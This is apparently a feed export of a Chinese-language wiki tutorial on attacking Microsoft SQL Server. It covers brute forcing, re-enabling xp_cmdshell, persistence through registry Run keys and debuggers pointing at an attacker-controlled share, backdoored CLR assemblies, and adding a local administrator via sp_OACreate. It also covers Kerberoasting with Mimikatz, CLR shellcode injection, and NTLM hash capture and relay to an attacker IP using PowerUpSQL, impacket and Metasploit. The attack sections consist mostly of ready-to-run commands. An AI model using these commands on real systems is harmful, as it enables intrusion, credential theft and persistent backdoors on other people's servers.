src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-2.png"></p><h4 id="其他方式实现持久化"><a href="#其他方式实现持久化" class="headerlink" title="其他方式实现持久化"></a>其他方式实现持久化</h4><p>出了正常利用SQL Server可以执行系统命令的存储过程，以下操作都是作为SQL对象存储在数据库中，并且没有任何更改到磁盘，也可以做到无文件持久化。</p><p>可以为utilman.exe设置调试器，该调试器将在调用cmd.exe时运行。仅sysadmins特权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">Get-SQLPersistentRegDebugger -Verbose -FileName utilman.exe -Command &#x27;c:\windows\system32\cmd.exe&#x27; -Instance SQLServerName\InstanceName&#x27;</span><br></pre></td></tr></table></figure><p>可以利用CurrentVersion \run与xp_regwrite建立。仅sysadmins特权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">Get-SQLPersistentRegRun -Verbose -Name legit -Command &#x27;\\attacker_controlled_ip\malicious.exe&#x27; -Instance &#x27;SQLServerName\InstanceName&#x27;</span><br></pre></td></tr></table></figure><p>可以将所有自定义CLR程序集导出到DLL，最后导入后门CLR。仅sysadmins特权。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">$Results = Get-SQLStoredProcedureCLR -Verbose -Instance &#x27;SQLServerName\InstanceName&#x27; -UserName sa -Password &#x27;password&#x27; -ExportFolder c:\temp</span><br><span class="line">Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.exe</span><br></pre></td></tr></table></figure><p>如果遇到SQLServer中的xplog70.dll文件被删除或放到其他地方了， xp_cmdshell就无法执行我们发出的命令了。可以考虑SQLServer中有一系列与OLE相关的存储过程，这一系列的存储过程同xp_cmdshell以及读取注册表系列的存储过程一样危险，所以被删除的可能性就小一些。这系列的存储过程有sp_OACreate，sp_OADestroy，sp_OAGetErrorInfo，sp_OAGetProperty，sp_OAMethod，sp_OASetProperty，sp_OAStop。</p><p>可以在系统添加一个用户名为test，密码为12345678，并加入管理员组。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DECLARE @shell INT EXEC SP_OACREATE &#x27;wscript.shell&#x27;,@shell OUTPUT EXEC  SP_OAMETHOD @shell,&#x27;run&#x27;,null, &#x27;c:\windows\system32\cmd.exe /c net user test  12345678 /add&#x27;</span><br><span class="line"></span><br><span class="line">DECLARE @shell INT EXEC SP_OACREATE &#x27;wscript.shell&#x27;,@shell OUTPUT  EXEC SP_OAMETHOD @shell,&#x27;run&#x27;,null, &#x27;c:\windows\system32\cmd.exe /c net  localgroup administrators test /add &#x27;</span><br></pre></td></tr></table></figure><p>xp_cmdshell、SP_OACREATE等可执行系统命令的存储过程，以及与它们相对应的动态连接库文件（DLL）都被删除了，还可以读取和修改注册表的存储过程（xp_regread、xp_regwrite）来克隆对方系统的管理员用户。</p><p>PowerUpSQL命令参考：</p><table><thead><tr><th>描述</th><th align="left">命令</th></tr></thead><tbody><tr><td>将所有自定义CLR程序集导出到DLL。它们可以脱机反编译，并且通常包含密码。而且，无需过多努力即可将其借壳。</td><td align="left"><code>$Results = Get-SQLStoredProcedureCLR -Verbose -Instance Server1\Instance1 -Username sa -Password &#39;P@ssword!&#39; -ExportFolder c:\temp</code> `$Results</td></tr><tr><td>创建一个可用于导入现有（或后门）CLR程序集的SQL命令。</td><td align="left"><code>Create-SQLFileCLRDll -Verbose -SourceDllPath c:\temp\evil.dll</code> 博客：<a href="https://blog.netspi.com/attacking-sql-server-clr-assemblies/">https://blog.netspi.com/attacking-sql-server-clr-assemblies/)://blog.netspi.com/attacking-sql-server-clr-assemblies/</a></td></tr><tr><td>创建可用于导入CLR程序集以执行OS命令的DLL和SQL命令。</td><td align="left"><code>Create-SQLFileCLRDll -Verbose -ProcedureName runcmd -OutDir c:\temp -OutFile evil</code></td></tr><tr><td>获取共享SQL Server服务帐户的列表</td><td align="left">`Get-SQLInstanceDomain -Verbose</td></tr></tbody></table><h3 id="SQL-Server横向移动"><a href="#SQL-Server横向移动" class="headerlink" title="SQL Server横向移动"></a>SQL Server横向移动</h3><h4 id="Kerberoast攻击"><a href="#Kerberoast攻击" class="headerlink" title="Kerberoast攻击"></a>Kerberoast攻击</h4><p>利用传统的Kerberoast攻击方式进行横向移动，Kerberoast是一种针对Kerberos协议的攻击方式。根据Kerberos协议，当向活动目录完成身份验证后，密钥分发中心（KDC）会将服务授权的票据（TGT）发送给用户，作为访问资源时的身份凭证。当需要访问资源，向票据服务器（TGS）发送Kerberos票据时，首先需要使用具有有效身份用户的票据（TGT）向票据服务器（TGS）请求乡音的服务票据。当该票据（TGT）被验证具有此服务的权限是，会向用户发送一张新的票据。新的票据使用SPN关联的计算机中的服务账号的NTLM Hash。攻击者可以尝试不同的NTLM Hash来开启Kerberos票据。NTLM Hash对应的是服务账号的密码。</p><p>实施此攻击前有几个前提条件：</p><ul><li>域内用户运行的SQL Server已经手动注册过SPN</li><li>Kerberos协议加密方式为RC4_HMAC_MD5</li></ul><p>通过SQL Server能执行PowerShell命令的利用点和导入特定功能的CLR程序集即可完成Kerberoast攻击。</p><p>查看指定域内用户所注册的SPN</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -L SEC\MSSQL2</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-1.png"></p><p>通过上文设置WarSQLKit的DLL存在sp_Mimikatz存储，执行mimikatz。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">exec sp_cmdExec &#x27;sp_Mimikatz&#x27;;</span><br><span class="line">select * from WarSQLKitTemp //获取Mimikatz日志</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-2.png"></p><p>或者利用任何一种可以执行PowerShell命令的方式，可以请求到SPN的Kerberos票据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Add-Type -AssemblyName System.IdentityModel </span><br><span class="line">New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/MSSQL2.sec.com:1433&quot;</span><br><span class="line">exec xp_cmdshell &#x27;powershell Add-Type -AssemblyName System.IdentityModel ; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;MSSQLSvc/MSSQL2.sec.com:1433&quot;&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-3.png"></p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-4.png"></p><p>之后可以使用PowerShell命令远程下载部署<a href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>，或者<a href="https://github.com/nidem/kerberoast">kerberoast</a>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#mimikatz：kerberos::list /export</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-5.png"></p><p>导出的票据会保存到当前目录的kirbi文件。</p><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8B%E7%AF%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8-6.png"></p><p>利用<a href="https://github.com/nidem/kerberoast">kerberoast</a>中的tgsrepcrack.py脚本，离线破解NTLM Hash。</p><p>PowerUpSQL中使用Get-SQLServerPasswordHash，可自动提取SQL登录密码哈希：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUPSQL.psd1</span><br><span class="line">Get-SQLServerPasswordHash -Verbose -Instance &#x27;SQLServerName\InstanceName&#x27; -Migrate</span><br></pre></td></tr></table></figure><h4 id="CLR实现无文件落地横向移动"><a href="#CLR实现无文件落地横向移动" class="headerlink" title="CLR实现无文件落地横向移动"></a>CLR实现无文件落地横向移动</h4><p><a href="https://research.nccgroup.com/author/dcashncc/">David Cash</a>在<a href="https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/">MSSQL Lateral Movement</a>介绍了SQL Server中使用CLR自动执行横向移动而无文件落地和不需要xp_cmdshell，以及如何防止被检测到。</p><p>CLR相关的介绍在上文已经介绍，在此不再赘述。通常为实现命令执行而对MSSQL服务进行后期开发通常会利用XP_CMDSHELL存储过程在MSSQL进程的上下文中运行操作系统命令。要使用此技术运行自定义代码，通常需要使用LOLBINS，添加新的操作系统用户或通过BCP写入磁盘的二进制文件，这提供了明显的检测机会。</p><p>SQL Server服务进程可以执行提供给它的任何.NET代码，因此利用.NET代码进行横向移动，仅需要构建适当的DLL。作为概念的证明，为了生成了一个简单的程序集，该程序集对一些shellcode进行XOR并将其注入到生成的进程中。使用<a href="https://github.com/nccgroup/nccfsas/tree/main/Tools/Squeak">Squeak</a>可以简化CLR代码的创建和调用，下面是Squeak具备的一些功能：</p><ul><li><p>展示连接数据</p></li><li><p>从原始二进制文件和单字节XOR读取shellcode字节</p></li><li><p>生成一个MSSQL CLR DLL，该DLL对shellcode进行XOR，生成一个新进程，然后将shellcode注入其中。</p></li><li><p>计算DLL的SHA512哈希</p></li><li><p>生成带有硬编码参数的单个.NET可执行文件，以通过SQL连接执行DLL –该可执行文件执行以下操作：</p><ul><li><p>创建一个SQL连接</p></li><li><p>检查SQL Server版本</p></li><li><p>检查DBA权限</p></li><li><p>检查并记录现有的安全设置</p></li><li><p>修改安全设置</p></li><li><p>创建并运行程序集</p></li><li><p>恢复安全设置并删除程序集</p></li></ul></li></ul><p>使用<a href="https://github.com/nccgroup/nccfsas/tree/main/Tools/Squeak">Squeak</a>可以生成带有连接字符串和CLR程序集的独立可执行文件。CLR程序集的代码是从本地目录中的文件中加载，可以直接打开文件，也可以在工具中对其进行编辑。 </p><h4 id="UNC路径注入"><a href="#UNC路径注入" class="headerlink" title="UNC路径注入"></a>UNC路径注入</h4><p>UNC用于访问远程文件服务器，格式为\ip\file，如果我们可以执行这个功能，则可以强制SQL Server向我们进行身份验证，并且可以获得SQL Server服务帐号的NTLM密码哈希。</p><p>可以通过以下方式实现自动化：</p><ul><li>PowerUpSQL的Get-SQLServiceAccountPwHashes脚本</li><li>SQL NTLM Hash：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import-module .\PowerUpSQL.ps1`</span><br><span class="line">Import-Module C:\PowerUpSQL-master\Scripts\3rdparty\Inveigh.ps1</span><br><span class="line">Import-Module C:\PowerUpSQL-master\Scripts\pending\Get-SQLServiceAccountPwHashes.ps1</span><br><span class="line">Get-SQLServiceAccountPwHashes -Verbose -TimeOut 20 -CaptureIp attacker_controlled_ip</span><br></pre></td></tr></table></figure><ul><li>使用smbrelayx（impacket）</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python smbrelayx.py -h sqlserverIP -c &#x27;powershell empire launcher&#x27;</span><br></pre></td></tr></table></figure><ul><li>metasploit的SQL NTLM Hash：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/admin/mssql/mssql_ntlm_stealer</span><br><span class="line">set SMBPROXY attackerIP</span><br><span class="line">set RHOST webappwithsqliIP</span><br><span class="line">set GET_PATH pathtosqli</span><br><span class="line">run</span><br></pre></td></tr></table></figure><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><blockquote><ul><li><a href="https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm">https://www.quackit.com/sql_server/tutorial/sql_server_dts.cfm</a></li><li><a href="http://www.freetds.org/">http://www.freetds.org/</a></li><li><a href="http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html">http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html</a></li><li><a href="https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/">https://research.nccgroup.com/2021/01/21/mssql-lateral-movement/</a></li><li><a href="https://xz.aliyun.com/t/7534">https://xz.aliyun.com/t/7534</a></li><li><a href="https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit">https://github.com/EPICROUTERSS/MSSQL-Fileless-Rootkit-WarSQLKit</a></li><li><a href="https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration">https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/sql/introduction-to-sql-server-clr-integration</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;SQL-Server攻击实战思路&quot;&gt;&lt;a href=&quot;#SQL-Server攻击实战思路&quot; class=&quot;headerlink&quot; title=&quot;SQL Server攻击实战思路&quot;&gt;&lt;/a&gt;SQL Server攻击实战思路&lt;/h2&gt;&lt;p&gt;第</summary>
      
    
    
    
    <category term="数据库攻防" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/"/>
    
    <category term="SQL Server" scheme="http://example.com/categories/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL-Server/"/>
    
    
    <category term="SQL Server" scheme="http://example.com/tags/SQL-Server/"/>
    
  </entry>
  
  <entry>
    <title>SQL Server数据库攻防详解上篇</title>
    <link href="http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/"/>
    <id>http://example.com/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/</id>
    <published>2021-07-03T01:33:00.000Z</published>
    <updated>2021-07-03T02:50:24.892Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><p><strong>by Tahir 2021.3.5</strong></p><h2 id="SQL-Server概述"><a href="#SQL-Server概述" class="headerlink" title="SQL Server概述"></a>SQL Server概述</h2><p>SQL Server是Microsoft开发的关系数据库管理系统（RDBMS）。 它是市场上最受欢迎的DBMS之一。SQL Server具有极其广泛的用途，它可以在各个方面使用,从存储个人博客的内容到存储客户数据等。</p><p>在2017版之前，SQL Server仅适用于Windows。 SQL Server 2017中最大的变化之一是，它现在可在Linux和Docker容器上使用。 这意味着可以在Mac上运行SQL Server。</p><p>SQL Server的目前不同版本描述：</p><table><thead><tr><th align="left">版本</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">Enterprise Edition</td><td align="left">此版本仅在Windows Server操作系统上运行。 适用于对速度和可用性具有较高优先级的大型生产数据库服务器。提供复制和联机分析过程（OLAP）服务等功能，这些服务可能会增加其安全风险。</td></tr><tr><td align="left">Standard Edition</td><td align="left">该版本与Enterprise Edition相似，但缺少虚拟接口系统局域网（VI SAN）支持和某些高级OLAP功能。</td></tr><tr><td align="left">Personal Edition</td><td align="left">它旨在用于工作站和便携式计算机，而不是服务器。 其设计最多支持五个数据库用户。</td></tr><tr><td align="left">Developer Edition</td><td align="left">面向开发人员版本，它与Enterprise Edition具有相似的功能，但并不意味着可以在真实的生产环境中运行。</td></tr></tbody></table><h3 id="客户端-服务器数据库系统"><a href="#客户端-服务器数据库系统" class="headerlink" title="客户端/服务器数据库系统"></a>客户端/服务器数据库系统</h3><p>SQL Server是一个客户端/服务器数据库管理系统（DBMS）。 这允许有许多不同的客户端同时，全部连接到SQL Server。 这些客户端的每一个都可以通过不同的工具进行连接。</p><p>例如，一个客户端可能使用如SQL Server Management Studio（SSMS）之类的图形工具，而另一客户端可能使用诸如sqlcmd之类的命令行工具。 同时，网站也可以从Web应用程序连接到SQL Server。 并且可能有许多其他客户端都使用自己的工具出于自己的目的进行连接。 </p><p>客户端/服务器DBMS的主要优点是多个用户可以同时访问它，每个用户都有特定的访问级别。如果数据库管理员配置对应的权限，则任何连接到SQL Server的客户端将只能访问他们被允许访问的数据库。 他们只能执行允许执行的任务。 所有这些都从SQL Server本身内部进行控制。</p><h3 id="TDS协议"><a href="#TDS协议" class="headerlink" title="TDS协议"></a>TDS协议</h3><p>表格数据流（Tabular Data Stream, TDS）协议是一种数据库服务器和客户端间交互的应用层协议，为微软SQL Server数据库和Sybase公司数据库产品所采用。</p><p>目前TDS协议版本与SQL Server的对应关系：</p><table><thead><tr><th><strong>TDS Version</strong></th><th><strong>Supported Products</strong></th></tr></thead><tbody><tr><td>4.2</td><td>Sybase SQL Server &lt; 10 and Microsoft SQL Server 6.5</td></tr><tr><td>5.0</td><td>Sybase SQL Server &gt;= 10</td></tr><tr><td>7.0</td><td>Microsoft SQL Server 7.0</td></tr><tr><td>7.1</td><td>Microsoft SQL Server 2000</td></tr><tr><td>7.2</td><td>Microsoft SQL Server 2005</td></tr></tbody></table><p>详细的协议结构分析，请参考：<a href="http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html">http://freetds.cvs.sourceforge.net/checkout/freetds/freetds/doc/tds.html</a></p><h2 id="SQL-Server暴力破解"><a href="#SQL-Server暴力破解" class="headerlink" title="SQL Server暴力破解"></a>SQL Server暴力破解</h2><p><strong>SQL Server 2005远程连接配置</strong></p><p>​    下载并安装SQL server 2005，启动SQL server的方式如下：</p><ul><li>启动SQL Server Management Studio工具，设置数据库登录模式为混合模式，也就是启用sa账户。</li><li>登录数据库在根节点右键属性-&gt;连接，设置允许远程连接到服务器。</li><li>同样根节点右键方面-&gt;服务器配置，设置RemoteAccessEnabled的值为True。</li><li>启动SQL Server Configuration Manager工具，点击sql sever 服务，需要开启sql sever 和sql sever browser这两个服务。</li><li>SQL server网络配置中选择MSSQLSERVER的协议（有些是SQLEXPRESS，取决于安装数据库的版本）进行IP设置和端口的开启，需要注意的是需要将VIA协议设为禁止，其他打开。</li><li>打开本机防火墙设置-&gt;高级设置-&gt;入站规则-&gt;新建规则，设置端口为1433，一直到最后取个合适的名字保存即可，当然也可以直接关闭防火墙，但是不建议这样做，不安全。</li></ul><p>设置可远程访问SQL server 2005，首先查看SQL server 2005 TCP/IP协议访问的端口1433；其次配置防火墙允许其端口的访问。</p><p>使用msf来执行爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/mssql/mssql_login</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-1.png"></p><h2 id="SQL-Server危险的存储过程"><a href="#SQL-Server危险的存储过程" class="headerlink" title="SQL Server危险的存储过程"></a>SQL Server危险的存储过程</h2><h3 id="xp-cmdshell"><a href="#xp-cmdshell" class="headerlink" title="xp_cmdshell"></a>xp_cmdshell</h3><p><strong>查询xp_cmdshell存储过程是否存在</strong></p><p>xtype为对象类型，xtype=’x’，表示存储过程的对象类型为扩展存储过程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from master.dbo.sysobjects where xtype=&#x27;x&#x27; and name=&#x27;xp_cmdshell&#x27;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-3.png"></p><p>TSQL代码判断是否开启xp_cmdshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">declare @RunningOnACluster char(1)</span><br><span class="line">declare @xp_cmdshell_available char(1)</span><br><span class="line">declare @result int </span><br><span class="line">set @xp_cmdshell_available=&#x27;Y&#x27; </span><br><span class="line">set @result=0</span><br><span class="line">select @RunningOnACluster=case </span><br><span class="line">when convert(int, serverproperty(&#x27;IsClustered&#x27;)) = 1 then &#x27;Y&#x27;</span><br><span class="line">else &#x27;N&#x27; </span><br><span class="line">end </span><br><span class="line">if(0=(select value_in_use from sys.configurations where name=&#x27;xp_cmdshell&#x27;))</span><br><span class="line">set @xp_cmdshell_available=&#x27;N&#x27; if @RunningOnACluster=&#x27;Y&#x27; </span><br><span class="line">begin</span><br><span class="line">if @xp_cmdshell_available=&#x27;Y&#x27;</span><br><span class="line">select @result=1</span><br><span class="line">if @xp_cmdshell_available=&#x27;N&#x27;</span><br><span class="line">select @result=2</span><br><span class="line">end</span><br><span class="line">select @result</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-4.png"></p><p><strong>恢复xp_cmdshell存储过程</strong></p><p>解决Error Message:未能找到存储过程 ‘master..xp_cmdshell’。</p><p>第一步先删除：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">drop procedure sp_addextendedproc</span><br><span class="line">drop procedure sp_oacreate</span><br><span class="line">exec sp_dropextendedproc &#x27;xp_cmdshell&#x27;</span><br></pre></td></tr></table></figure><p>第二步恢复：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;sp_oacreate&quot;,&quot;odsole70.dll&quot;)</span><br><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot; &quot;)</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-2.png"></p><p>直接恢复，不管sp_addextendedproc是不是存在，需要自行上传xplog70.dll，恢复扩展存储过过程xp_cmdshell的语句:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dbcc addextendedproc(&quot;xp_cmdshell&quot;,&quot;xplog70.dll&quot;)</span><br></pre></td></tr></table></figure><p>代码判断一系列存储过程是否存在，若不存在则恢复。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_cmdshell]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_cmdshell&#x27;,&#x27;xplog70.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_dirtree]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_dirtree&#x27;,&#x27;xpstar.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_fixeddrives]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_fixeddrives&#x27;,&#x27;xpstar.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_regwrite]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_regwrite&#x27;,&#x27;xpstar.dll&#x27;)</span><br><span class="line">if not exists (select * from dbo.sysobjects where id = object_id(N&#x27;[dbo].[xp_regread]&#x27;))</span><br><span class="line">dbcc addextendedproc (&#x27;xp_regread&#x27;,&#x27;xpstar.dll&#x27;)</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-5.png"></p><p><strong>开启xp_cmdshell存储过程</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1; RECONFIGURE; exec SP_CONFIGURE &#x27;xp_cmdshell&#x27;, 1; RECONFIGURE;</span><br></pre></td></tr></table></figure><p><img src="/wiki/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2/SQL%20Server/SQL-Server%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E9%98%B2%E8%AF%A6%E8%A7%A3%E4%B8%8A%E7%AF%87/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%94%BB%E5%87%BB-6.png"></p><p><strong>关闭xp_cmdshell存储过程</strong></p><p>关闭xp_cmdshell配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &#x27;show advanced options&#x27;, 1;RECONFIGURE;EXEC sp_configure &#x27;xp_cmdshell&#x27;, 0;RECONFIGURE;</span><br></pre></td></tr></table></figure><p><img 